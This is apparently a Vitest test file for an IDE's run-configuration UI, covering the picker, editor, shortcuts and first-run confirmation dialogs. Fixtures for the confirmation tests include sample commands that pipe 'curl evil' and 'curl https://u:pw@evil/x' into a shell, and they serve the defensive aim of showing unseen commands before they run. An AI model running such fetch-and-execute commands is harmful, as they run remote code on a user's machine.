// @vitest-environment happy-dom
// 프로젝트 창(App kind="project")을 가짜 Host 에 붙여 실행 선택기 · 액션 · 첫 실행 확인 · 구성 편집을 본다(17-m6-plan M6-07 완료 기준
// ① ② ④ ⑤ 와 ⑥ 의 확인 화면). StrictMode 로 그린다(test-support/strict-mode.ts). 문자열은 ko 로, 한 시험은 en 으로 그린다.

import type {
  ConfigView,
  HostInfo,
  KeymapFile,
  RunConfigList,
  RunConfirmRequired,
} from "@pitwall/rpc-client";
import { act } from "react";
import { createRoot, type Root } from "react-dom/client";
import { afterEach, beforeEach, expect, it, vi } from "vitest";

import defaultTheme from "../../../../extensions/theme-default/themes/default.json";
import { App } from "../App";
import type { KeymapNative } from "../keymap/native";
import { createThemeStore } from "../theme/theme-store";
import { ThemeStoreProvider } from "../theme/theme-switcher";
import { parseTheme } from "../theme/tokens";
import { closeRunConfigEditor } from "./config-editor";
import { runInfo } from "./fake-run-host";
import { resetWindowRunConfigs } from "./run-configs";
import { windowRuns } from "./run-tabs";

declare global {
  var IS_REACT_ACT_ENVIRONMENT: boolean;
}

type Handler = (
  params: Record<string, unknown>,
) => { result: unknown } | { error: { code: number; message: string; data?: unknown } };

const host = vi.hoisted(() => ({
  locale: "ko",
  list: undefined as unknown,
  calls: [] as { method: string; params: Record<string, unknown> }[],
  handlers: {} as Record<string, Handler>,
  send: (_m: object) => {},
}));

vi.mock("@tauri-apps/api/webview", () => ({
  getCurrentWebview: () => ({ onDragDropEvent: async () => () => {} }),
}));

vi.mock("../tauri-transport", async () => {
  const { createMemoryTransportPair: pair } = await import("@pitwall/rpc-client");
  const { DEFAULT_KEYMAP_TOML } = await import("../keymap/default-keymap");
  const { i18nState } = await import("../i18n/testing");
  return {
    connectHost: async () => {
      const [client, server] = pair();
      let next = 1;
      const send = (m: object) => server.send(JSON.stringify({ jsonrpc: "2.0", ...m }));
      host.send = send;
      server.onMessage((text) => {
        const m = JSON.parse(text) as { id?: number; method: string; params: never };
        const reply = (result: unknown) => send({ id: m.id, result });
        host.calls.push({ method: m.method, params: m.params ?? {} });
        const handler = host.handlers[m.method];
        if (handler) {
          const out = handler(m.params ?? {});
          return "result" in out ? reply(out.result) : send({ id: m.id, error: out.error });
        }
        switch (m.method) {
          case "i18n.get":
            return reply(i18nState(host.locale));
          case "config.get":
            return reply({
              snapshot: { files: [], notices: [] },
              error: null,
            } satisfies ConfigView);
          case "keymap.get":
            return reply({
              id: "pitwall-default",
              extension: "dev.pitwall.keymap-default",
              kind: "base",
              content: DEFAULT_KEYMAP_TOML,
            } satisfies KeymapFile);
          case "host.info":
            return reply({
              hostId: "local",
              kind: "local",
              version: "0",
              os: "t",
              arch: "t",
            } satisfies HostInfo);
          case "project.get":
            return reply({ id: "p1", name: "demo", roots: ["/main"] });
          case "project.trust":
            return reply({ trusted: true, ownerId: "p1", asked: true });
          case "task.list":
            return reply([]);
          case "events.subscribe":
            return reply({ subscriptionId: next++ });
          case "run.list":
            return reply({ runs: [] });
          case "run.config.list":
            return reply(host.list);
          case "run.attach":
            return reply({ streamId: next++ });
          case "stream.cancel":
          case "stream.credit":
            return;
          default:
            return m.id === undefined
              ? undefined
              : send({ id: m.id, error: { code: -32601, message: `no ${m.method}` } });
        }
      });
      return { transport: client, close: async () => {} };
    },
  };
});

let menuAction: ((action: string) => void) | undefined;
const native: KeymapNative = {
  syncMenu: async () => {},
  onMenuAction: (handler) => {
    menuAction = handler;
    return () => {
      menuAction = undefined;
    };
  },
  openSettings: async () => {},
  closeWindow: async () => {},
  guardClose: () => () => {},
};

const LIST: RunConfigList = {
  configs: [
    {
      id: "dev",
      config: {
        name: "Dev Server",
        type: "shell",
        command: "pnpm dev",
        cwd: null,
        env: {},
        envFile: [],
        profiles: { fast: { env: { MODE: "fast" } } },
        debug: null,
      },
      layers: [{ origin: "shared", path: "/main/.pitwall/run/dev.toml" }],
    },
  ],
  unusable: [
    {
      id: "broken",
      name: "Broken",
      reason: "unknown type `rocket`",
      layers: [{ origin: "shared", path: "/main/.pitwall/run/broken.toml" }],
    },
  ],
  detected: [
    {
      key: "detected:npm:test",
      detector: "npm",
      source: "/main/package.json",
      config: { name: "test", type: "npm", script: "test", env: {}, envFile: [] },
    },
  ],
  detectProblems: [],
  taskLists: [{ detector: "gradle", state: "notRead" }],
  problem: null,
};

let root: Root | undefined;

beforeEach(() => {
  globalThis.IS_REACT_ACT_ENVIRONMENT = true;
  vi.spyOn(navigator, "userAgent", "get").mockReturnValue(
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
  );
  vi.spyOn(console, "info").mockImplementation(() => {});
  vi.spyOn(console, "warn").mockImplementation(() => {});
  host.locale = "ko";
  host.list = structuredClone(LIST);
  host.calls = [];
  host.handlers = {};
  localStorage.clear();
  sessionStorage.clear();
  resetWindowRunConfigs();
  window.history.replaceState(null, "", "/?window=project&project=p1");
});

afterEach(() => {
  act(() => closeRunConfigEditor());
  act(() => windowRuns().disposeAll());
  act(() => root?.unmount());
  root = undefined;
  document.body.innerHTML = "";
  vi.restoreAllMocks();
});

const settle = () => act(async () => new Promise((r) => setTimeout(r, 30)));

async function mount() {
  const element = document.createElement("div");
  element.style.width = "1280px";
  element.style.height = "800px";
  document.body.append(element);
  const store = createThemeStore({
    system: { current: () => "light", subscribe: () => () => {} },
    storage: { read: () => undefined, write: () => {} },
    theme: parseThemeOnce(),
    apply: () => {},
  });
  root = createRoot(element);
  await act(async () =>
    root!.render(
      <ThemeStoreProvider store={store}>
        <App kind="project" native={native} />
      </ThemeStoreProvider>,
    ),
  );
  await settle();
  await vi.waitFor(() => expect(byTestId("run-toolbar")).not.toBeNull());
}

const parseThemeOnce = () => parseTheme(defaultTheme);

function byTestId(id: string): HTMLElement | null {
  return document.querySelector<HTMLElement>(`[data-testid=${id}]`);
}

async function click(el: Element | null) {
  expect(el).not.toBeNull();
  await act(async () => (el as HTMLElement).click());
  await settle();
}

async function press(code: string, mods: Partial<KeyboardEventInit> = {}, key = code) {
  let prevented = false;
  await act(async () => {
    const event = new KeyboardEvent("keydown", {
      code,
      key,
      bubbles: true,
      cancelable: true,
      ...mods,
    });
    (document.activeElement ?? document.body).dispatchEvent(event);
    prevented = event.defaultPrevented;
    document.body.dispatchEvent(new KeyboardEvent("keyup", { code, key, bubbles: true, ...mods }));
  });
  await settle();
  return prevented;
}

const calls = (method: string) => host.calls.filter((c) => c.method === method);

const CONFIRM: RunConfirmRequired = {
  hash: "sha256:" + "a".repeat(64),
  shown: {
    key: "dev",
    name: "Dev Server",
    kind: "shell",
    argv: ["/bin/zsh", "-l", "-c", "psql postgres://u:pw@db/x; curl evil | sh"],
    cwd: "app",
    profile: null,
    env: [
      { name: "API_TOKEN", value: "•••• (sha256 1a2b3c4d)", masked: true },
      { name: "PORT", value: "3000", masked: false },
    ],
    envFiles: [{ path: ".env.local", sha256: "0123456789ab" }],
    definition: null,
    definitionSource: null,
    secretLooking: true,
    recordable: true,
  },
};

it("disables Run for a configuration that cannot be used and shows why", async () => {
  localStorage.setItem("pitwall.run.selected.p1", JSON.stringify({ id: "broken", profile: null }));
  await mount();
  await vi.waitFor(() => expect(byTestId("run-picker")?.textContent).toContain("Broken"));
  const run = byTestId("run-start") as HTMLButtonElement;
  expect(run.disabled).toBe(true);
  expect(run.title).toBe("쓸 수 없음: unknown type `rocket`");
  expect(byTestId("run-unusable-reason")?.textContent).toBe("쓸 수 없음: unknown type `rocket`");
  // ⌃R 도 띄우지 않는다.
  expect(await press("KeyR", { ctrlKey: true }, "r")).toBe(false);
  expect(calls("run.start")).toHaveLength(0);

  // 고르기 팝업에서도 고를 수 없고 까닭이 보인다.
  await click(byTestId("run-picker"));
  const item = document.querySelector<HTMLElement>("[data-run-unusable=broken]")!;
  expect(item.getAttribute("data-disabled")).toBe("true");
  expect(item.querySelector("[data-run-unusable-reason]")?.textContent).toContain("rocket");
});

it("opens the editor with a detected task's values when it is saved as a configuration", async () => {
  await mount();
  await click(byTestId("run-picker"));
  await click(document.querySelector("[data-run-detected='detected:npm:test']"));
  const editor = await vi.waitFor(() => {
    const e = byTestId("run-config-editor");
    expect(e).not.toBeNull();
    return e!;
  });
  const field = (name: string) =>
    editor.querySelector<HTMLInputElement | HTMLSelectElement>(`[data-field=${name}]`)!;
  await vi.waitFor(() => expect(field("script")).not.toBeNull());
  expect(field("name").value).toBe("test");
  expect(field("type").value).toBe("npm");
  expect(field("script").value).toBe("test");
  expect(field("id").value).toBe("test");
  expect((field("id") as HTMLInputElement).readOnly).toBe(false);

  host.handlers["run.config.save"] = () => ({
    result: { path: "/main/.pitwall/run/test.toml", changed: true },
  });
  await click([...editor.querySelectorAll("button")].find((b) => b.textContent === "저장")!);
  const [save] = calls("run.config.save");
  expect(save?.params).toMatchObject({
    projectId: "p1",
    id: "test",
    location: "shared",
    config: { name: "test", type: "npm", script: "test", env: {}, envFile: [] },
  });
  expect(byTestId("run-config-editor")).toBeNull();
});

it("lists the run actions in Find Action", async () => {
  await mount();
  // 중지는 멈출 실행이 있을 때만 켜진다.
  act(() => windowRuns().upsert(runInfo({ runId: "r1", config: "dev" })));
  await settle();
  await press("KeyA", { metaKey: true, shiftKey: true }, "a");
  const items = [...document.querySelectorAll("[cmdk-item]")].map((e) => e.textContent ?? "");
  for (const [label, key] of [
    ["실행(현재 구성)", "⌃R"],
    ["실행 구성 골라 실행", "⌃⌥R"],
    ["실행 중지", "⌘F2"],
    ["실행 구성 편집", ""],
  ] as const)
    expect(items, label).toContain(`${label}${key}`);
  // 디버그는 지금 구성(dev)에 `[debug]` 가 없어 실행할 수 없어 목록에 없다(M6-18).
  expect(items.some((i) => i.startsWith("디버그(현재 구성)"))).toBe(false);
});

it("stops a run with ⌘F2 outside the DB console but not inside it", async () => {
  await mount();
  host.handlers["run.stop"] = (p) => ({
    result: runInfo({ runId: p.runId as string, state: "stopping" }),
  });
  act(() => windowRuns().upsert(runInfo({ runId: "r1", config: "dev" })));
  await settle();

  const console = document.createElement("div");
  console.dataset.keymapContext = "dbConsoleFocus";
  console.tabIndex = 0;
  document.body.append(console);
  act(() => console.focus());
  expect(await press("F2", { metaKey: true }, "F2")).toBe(false);
  expect(calls("run.stop")).toHaveLength(0);

  act(() => console.blur());
  console.remove();
  expect(await press("F2", { metaKey: true }, "F2")).toBe(true);
  expect(calls("run.stop").map((c) => c.params)).toEqual([{ runId: "r1" }]);
});

it("shows unseen content before running it, Cancel focused first, and runs with the confirmation", async () => {
  await mount();
  let starts = 0;
  host.handlers["run.start"] = (p) => {
    starts++;
    if (p.confirmed !== CONFIRM.hash)
      return { error: { code: 7001, message: "not seen", data: CONFIRM } };
    return { result: runInfo({ runId: "r9", config: "dev", name: "Dev Server" }) };
  };
  await click(byTestId("run-start"));
  const dialog = await vi.waitFor(() => {
    const d = byTestId("run-confirm-dialog");
    expect(d).not.toBeNull();
    return d!;
  });
  // 실행될 글은 가리지 않는다 — 명령 그대로, 비밀처럼 보이면 경고.
  expect(byTestId("run-confirm-command")?.textContent).toBe(
    "/bin/zsh -l -c 'psql postgres://u:pw@db/x; curl evil | sh'",
  );
  expect(byTestId("run-confirm-secret")).not.toBeNull();
  expect(byTestId("run-confirm-cwd")?.textContent).toBe("app");
  expect(byTestId("run-confirm-env")?.textContent).toContain("PORT=3000");
  expect(byTestId("run-confirm-env")?.textContent).toContain("API_TOKEN=•••• (sha256 1a2b3c4d)");
  expect(document.activeElement?.textContent).toBe("취소");
  expect(calls("run.start")[0]?.params).toMatchObject({ configId: "dev", confirmed: null });

  // 취소하면 다시 부르지 않는다.
  await click(document.activeElement);
  expect(byTestId("run-confirm-dialog")).toBeNull();
  expect(starts).toBe(1);

  // 다시 ▶ → [실행] 이면 받은 해시를 실어 다시 부르고, 탭이 생긴다.
  await click(byTestId("run-start"));
  await click(
    [...byTestId("run-confirm-dialog")!.querySelectorAll("button")].find(
      (b) => b.textContent === "실행",
    )!,
  );
  expect(calls("run.start").map((c) => c.params.confirmed)).toEqual([null, null, CONFIRM.hash]);
  expect(
    windowRuns()
      .store.getState()
      .tabs.map((t) => t.key),
  ).toEqual(["r9"]);
  void dialog;
});

it("asks the same question when a tab reruns changed content", async () => {
  await mount();
  host.handlers["run.restart"] = (p) =>
    p.confirmed === CONFIRM.hash
      ? { result: runInfo({ runId: "r2", restartOf: "r1" }) }
      : { error: { code: 7001, message: "not seen", data: CONFIRM } };
  act(() =>
    windowRuns().upsert(runInfo({ runId: "r1", state: "exited", exit: { code: 0, signal: null } })),
  );
  await settle();
  let restart!: Promise<void>;
  await act(async () => {
    restart = windowRuns().restart("r1");
    await new Promise((r) => setTimeout(r, 50));
  });
  expect(byTestId("run-confirm-dialog")).not.toBeNull();
  await click(
    [...byTestId("run-confirm-dialog")!.querySelectorAll("button")].find(
      (b) => b.textContent === "실행",
    )!,
  );
  await act(async () => restart);
  expect(calls("run.restart").map((c) => c.params)).toEqual([
    { runId: "r1", confirmed: null },
    { runId: "r1", confirmed: CONFIRM.hash },
  ]);
  expect(windowRuns().tab("r1")?.run.runId).toBe("r2");
});

it("edits a configuration with the form and shows what saving writes as TOML", async () => {
  await mount();
  await act(async () => menuAction!("run.editConfigs"));
  await settle();
  const editor = await vi.waitFor(() => {
    const e = byTestId("run-config-editor");
    expect(e?.querySelector("[data-field=command]")).not.toBeNull();
    return e!;
  });
  const command = editor.querySelector<HTMLInputElement>("[data-field=command]")!;
  expect(command.value).toBe("pnpm dev");
  expect((editor.querySelector("[data-field=id]") as HTMLInputElement).readOnly).toBe(true);
  host.handlers["run.config.preview"] = (p) => ({
    result: {
      path: "/main/.pitwall/run/dev.toml",
      before: "schema = 1\n",
      text: `# kept\ncommand = ${JSON.stringify((p.config as { command: string }).command)}\n`,
    },
  });
  await act(async () => {
    const setter = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, "value")!.set!;
    setter.call(command, "pnpm dev --host");
    command.dispatchEvent(new Event("input", { bubbles: true }));
  });
  await click(editor.querySelector("[data-tab=toml]"));
  await vi.waitFor(() =>
    expect(byTestId("run-config-toml")?.textContent).toContain('command = "pnpm dev --host"'),
  );
  const [preview] = calls("run.config.preview");
  // 폼 밖의 프로필은 그대로 넘긴다.
  expect(preview?.params).toMatchObject({
    id: "dev",
    config: { command: "pnpm dev --host", profiles: { fast: { env: { MODE: "fast" } } } },
  });
});

it("refuses to save while a field the schema requires is empty", async () => {
  await mount();
  await click(byTestId("run-picker"));
  await click(
    [...document.querySelectorAll("[cmdk-item]")].find((e) => e.textContent === "새 구성…")!,
  );
  const editor = await vi.waitFor(() => {
    const e = byTestId("run-config-editor");
    expect(e?.querySelector("[data-field=command]")).not.toBeNull();
    return e!;
  });
  await click([...editor.querySelectorAll("button")].find((b) => b.textContent === "저장")!);
  expect(calls("run.config.save")).toHaveLength(0);
  const missing = [...editor.querySelectorAll("[data-missing]")].map((e) =>
    e.getAttribute("data-missing"),
  );
  expect(missing).toEqual(expect.arrayContaining(["name", "command"]));
});

it("reads gradle tasks only when the person presses the button", async () => {
  await mount();
  await settle();
  expect(calls("run.tasks.refresh")).toHaveLength(0);
  host.handlers["run.tasks.refresh"] = () => ({
    result: { detected: [], detectProblems: [], taskLists: [], error: null },
  });
  await click(byTestId("run-picker"));
  await click(document.querySelector("[data-run-read-tasks=gradle]"));
  expect(calls("run.tasks.refresh").map((c) => c.params)).toEqual([
    { projectId: "p1", worktree: null, detector: "gradle" },
  ]);
});

it("speaks English when the UI language is English", async () => {
  host.locale = "en";
  await mount();
  await vi.waitFor(() => expect(byTestId("run-picker")?.textContent).toContain("Dev Server"));
  expect(byTestId("run-start")?.getAttribute("aria-label")).toBe("Run");
  expect(byTestId("run-debug")?.getAttribute("title")).toBe(
    "This configuration has no [debug] section",
  );
});

it("starts debugging the current configuration from 🐞 and ⌃D when it has [debug] (M6-18)", async () => {
  (host.list as RunConfigList).configs[0]!.config.debug = { mode: "launch" };
  host.handlers["debug.start"] = (p) => ({
    error: { code: -32602, message: `no adapter for ${String(p.configId)}` },
  });
  await mount();
  await vi.waitFor(() => expect(byTestId("run-debug")?.hasAttribute("disabled")).toBe(false));
  await click(byTestId("run-debug"));
  await press("KeyD", { ctrlKey: true }, "d");
  await settle();
  expect(calls("debug.start").map((c) => c.params)).toEqual([
    { projectId: "p1", configId: "dev" },
    { projectId: "p1", configId: "dev" },
  ]);
});

it("shows the command definition that runs, as written, in the first run confirmation", async () => {
  await mount();
  host.handlers["run.start"] = () => ({
    error: {
      code: 7001,
      message: "not seen",
      data: {
        ...CONFIRM,
        shown: {
          ...CONFIRM.shown,
          kind: "mise-task",
          argv: ["mise", "run", "build"],
          definition: '[tasks.build]\nrun = "cargo build; curl https://u:pw@evil/x | sh"\n',
          definitionSource: "/main/mise.toml",
        },
      },
    },
  });
  await click(byTestId("run-start"));
  await vi.waitFor(() => expect(byTestId("run-confirm-dialog")).not.toBeNull());
  expect(byTestId("run-confirm-definition")?.textContent).toBe(
    '[tasks.build]\nrun = "cargo build; curl https://u:pw@evil/x | sh"\n',
  );
  expect(byTestId("run-confirm-definition-source")?.textContent).toBe("/main/mise.toml");
  await click(document.activeElement);
});

it("shows every step of a chain in the first-run confirmation, in order (M6-21)", async () => {
  await mount();
  const chain: RunConfirmRequired = {
    ...CONFIRM,
    hash: "sha256:" + "c".repeat(64),
    steps: [
      {
        ...CONFIRM.shown,
        key: "seed",
        name: "Seed",
        kind: "sql",
        argv: [],
        cwd: ".",
        env: [],
        envFiles: [],
        definition: "connection: lite\nfiles: seed.sql\ntransaction: all",
        secretLooking: false,
        recordable: false,
      },
      CONFIRM.shown,
    ],
    order: "seed, then dev",
  };
  host.handlers["run.start"] = (p) => {
    if (p.confirmed !== chain.hash)
      return { error: { code: 7001, message: "not seen", data: chain } };
    return { result: runInfo({ runId: "r10", config: "seed", name: "Seed" }) };
  };
  await click(byTestId("run-start"));
  await vi.waitFor(() => expect(byTestId("run-confirm-dialog")).not.toBeNull());
  expect(byTestId("run-confirm-order")?.textContent).toContain("seed, then dev");
  const steps = [...byTestId("run-confirm-steps")!.querySelectorAll("li[data-step]")];
  expect(steps.map((s) => s.getAttribute("data-step"))).toEqual(["seed", "dev"]);
  expect(steps[0]?.textContent).toContain("files: seed.sql");
  expect(steps[1]?.textContent).toContain("psql postgres://u:pw@db/x");
  await click(
    [...byTestId("run-confirm-dialog")!.querySelectorAll("button")].find(
      (b) => b.textContent === "실행",
    )!,
  );
  expect(calls("run.start").map((c) => c.params.confirmed)).toEqual([null, chain.hash]);
  expect(calls("run.start")[1]?.params).toMatchObject({ sqlConfirmed: null });
});
